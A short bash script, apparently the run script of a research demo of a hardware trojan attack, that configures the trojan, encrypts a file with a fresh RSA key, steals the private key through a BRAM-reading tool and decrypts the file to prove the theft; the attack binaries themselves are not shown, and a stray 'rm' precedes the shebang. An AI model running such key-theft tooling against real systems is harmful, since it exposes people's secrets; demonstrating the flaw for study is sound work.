rm #!/bin/bash

# Run the attack
echo "--------------------------------------------------------------------------"
echo "Coherent Trojan Configrued"
./find_pattern

echo "--------------------------------------------------------------------------"
echo "Generating a RSA private key and encrypting a file"
./openssl.sh enc

echo "--------------------------------------------------------------------------"
echo "Stealing the private key"
./read_BRAM -cmd char

echo "--------------------------------------------------------------------------"
echo "Decrypting the file with the stolen private key"
./openssl.sh dec

echo "--------------------------------------------------------------------------"
echo "Files"
ls -l

echo "--------------------------------------------------------------------------"
echo "Comparing the original and decrypted files"
diff -s file.txt file.dec

echo "--------------------------------------------------------------------------"
echo "Original Plaintext"
cat file.txt
echo "Decrypted Plaintext with stolen key"
cat file.dec
